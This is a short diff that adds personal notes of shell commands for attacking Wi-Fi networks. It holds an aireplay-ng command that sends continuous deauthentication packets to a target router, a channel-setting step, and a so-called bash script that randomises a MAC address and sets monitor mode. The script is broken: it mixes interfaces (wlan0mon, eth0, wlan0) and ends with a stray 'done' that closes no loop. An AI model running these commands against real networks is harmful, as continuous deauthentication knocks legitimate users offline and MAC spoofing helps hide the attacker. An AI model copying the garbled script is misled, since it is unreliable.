@@ -1,0 +1,15 @@
+1) :::in terminal:::
+        aireplay-ng -0 0 -a mac_of_router wlan0mon
+
+2)changing channel of card to same channel::::
+       iwconfig wlan0mon channel 6
+
+3)bash script to change mac adress:::
+       ifconfig wlan0mon down
+       macchanger -r eth0 | grep "new mac"
+       iwconfig wlan0 mode monitor
+       ifconfig wlan0 up 
+       iwconfig wlan0 | grep mode
+       sleep 3
+       echo waiting!!!!
+       done
